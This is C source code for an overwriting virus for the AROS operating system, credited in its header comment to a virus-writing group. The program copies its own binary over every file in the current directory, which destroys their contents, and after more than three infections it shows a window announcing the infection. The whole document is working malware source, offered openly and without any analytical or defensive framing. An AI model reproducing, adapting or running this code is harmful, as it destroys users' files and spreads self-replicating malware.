   /* This is the first virus for the AROS Os by [WarGame/doomriderz]
    * It overwrites everyfile in current dir
    * Thx to darkv0id for the name of this :) */

   #include <stdio.h>
   #include <dirent.h>
   #include <stdlib.h>
   #include <proto/intuition.h>
   #include <intuition/intuition.h>
   #include <sys/stat.h>

   void PrintWindow(void)
   {
       struct Window *payloadwin = NULL;

       payloadwin = OpenWindowTags(NULL,WA_Width,300,WA_Height,20,
               WA_Title,"Infected by AROS.Libido by [WarGame/doomriderz]",TAG_DONE);

       if(payloadwin)
       {
           sleep(5);
           CloseWindow(payloadwin);
       }
   }

   int main(int argc,char *argv[])
   {
       DIR *current_dir = NULL;
       struct dirent *cur = NULL;
       FILE *fp = NULL;
       char *vircode = NULL;
       int virsize,fd,infectnum = 0;
       struct stat fz;


       if(!(current_dir = opendir(".")))
       {
           exit(0);
       }


       if((fp = fopen(argv[0],"r")) == NULL)
       {
           exit(0);
       }

       fd = fileno(fp);
       fstat(fd,&fz);
       virsize = fz.st_size;

       if((vircode = malloc(virsize)) == NULL)
       {
           exit(0);
       }

       fread(vircode,virsize,1,fp);
       fclose(fp);
       close(fd);

       while((cur = readdir(current_dir)))
       {
           if((fp = fopen(cur->d_name,"w")) != NULL)
           {
               fwrite(vircode,virsize,1,fp);
               fclose(fp);
               infectnum++;
           }
       }

       closedir(current_dir);
       free(vircode);

       if(infectnum > 3)
       {
       PrintWindow();
       }

   }
